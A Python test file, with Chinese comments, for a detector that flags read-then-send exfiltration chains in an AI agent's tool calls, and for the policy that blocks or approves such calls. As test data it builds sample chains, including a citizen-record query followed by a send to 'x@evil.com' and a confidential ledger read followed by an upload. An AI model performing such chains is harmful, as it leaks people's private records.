"""SequenceChainAnalyzer:有序动作链检测,并验证策略据 chain_risk_at_least 分级处置。

analyze / decide 均为 async 端口,测试用 asyncio.run 同步包装(与 test_policy_yaml 一致,免依赖)。
"""

from __future__ import annotations

import asyncio

from fulcrum.capabilities.policy.yaml_policy import YamlPolicyEngine
from fulcrum.capabilities.toolguard.sequence_chain import SequenceChainAnalyzer
from fulcrum.core.domain import Context, Disposition, Finding, ToolIntent

_CTX = Context(session_id="s")


def _intent(tool: str, **args: object) -> ToolIntent:
    return ToolIntent(session_id="s", tool_name=tool, arguments=dict(args))


def _analyze(*intents: ToolIntent) -> list[Finding]:
    return asyncio.run(SequenceChainAnalyzer().analyze(list(intents), _CTX))


# ---- 分析器 ----
def test_read_then_send_flags_medium_chain() -> None:
    findings = _analyze(
        _intent("doc.read", path="public/guide.txt"), _intent("external.send", to="a@x.cn")
    )
    assert len(findings) == 1
    f = findings[0]
    assert f.kind == "chain.exfiltration"
    assert f.score == 0.5
    assert f.evidence["severity"] == "medium"
    assert f.evidence["pattern"] == "read->exfil"


def test_sensitive_read_then_send_flags_critical_chain() -> None:
    """敏感读取(按工具名 citizen.query)→ 外发 → 高分 critical。"""
    findings = _analyze(
        _intent("citizen.query", keyword="王某"), _intent("external.send", to="x@evil.com")
    )
    assert findings[0].score == 0.85
    assert findings[0].evidence["severity"] == "critical"
    assert findings[0].evidence["pattern"] == "sensitive_read->exfil"


def test_sensitive_path_read_then_send_is_critical() -> None:
    """敏感路径读取(confidential/…)→ 外发 → critical(复用 argrisk 路径判定)。"""
    findings = _analyze(
        _intent("file.read", path="confidential/fund_ledger.txt"),
        _intent("http.request", url="https://gov.cn/upload"),
    )
    assert findings[0].score == 0.85


def test_finding_is_tied_to_current_intent() -> None:
    send = _intent("external.send", to="a@x.cn")
    findings = _analyze(_intent("doc.read", path="p.txt"), send)
    assert findings[0].evidence["intent_id"] == send.intent_id


def test_outbound_without_prior_read_no_finding() -> None:
    assert _analyze(_intent("external.send", to="a@x.cn")) == []


def test_read_without_following_send_no_finding() -> None:
    """当前(最新)步是读取、不是外发 → 不收口判链。"""
    assert _analyze(_intent("kb.search", query="低保"), _intent("doc.read", path="p.txt")) == []


def test_read_outside_window_no_finding() -> None:
    """读取距外发超出回看窗口(12 步)→ 不构成链。"""
    fillers = [_intent("case.approve", application_id=str(i)) for i in range(12)]
    trace = [_intent("doc.read", path="p.txt"), *fillers, _intent("external.send", to="a@x.cn")]
    assert _analyze(*trace) == []


# ---- 策略消费(default.yml 的 block-exfil-chain / approve-readsend-chain)----
def _decide_with_chain(score: float | None, *, tool: str = "http.request") -> Disposition:
    engine = YamlPolicyEngine("data/policies/default.yml")
    intent = _intent(tool, url="https://gov.cn/x")  # 白名单域,避免命中其它阻断规则
    ctx = Context(session_id="s")
    if score is not None:
        ctx.findings.append(
            Finding(
                kind="chain.exfiltration", score=score, evidence={"intent_id": intent.intent_id}
            )
        )
    return asyncio.run(engine.decide(intent, ctx)).decision


def test_policy_blocks_critical_chain() -> None:
    assert _decide_with_chain(0.85) == Disposition.BLOCK


def test_policy_approves_medium_chain() -> None:
    assert _decide_with_chain(0.5) == Disposition.APPROVE


def test_policy_ignores_chain_finding_of_other_intent() -> None:
    """链 finding 的 intent_id 不匹配当前调用 → 不计入 chain_risk,按默认放行。"""
    engine = YamlPolicyEngine("data/policies/default.yml")
    intent = _intent("http.request", url="https://gov.cn/x")
    ctx = Context(session_id="s")
    ctx.findings.append(
        Finding(kind="chain.exfiltration", score=0.85, evidence={"intent_id": "someone-else"})
    )
    assert asyncio.run(engine.decide(intent, ctx)).decision == Disposition.ALLOW


def test_no_chain_finding_allows() -> None:
    assert _decide_with_chain(None) == Disposition.ALLOW
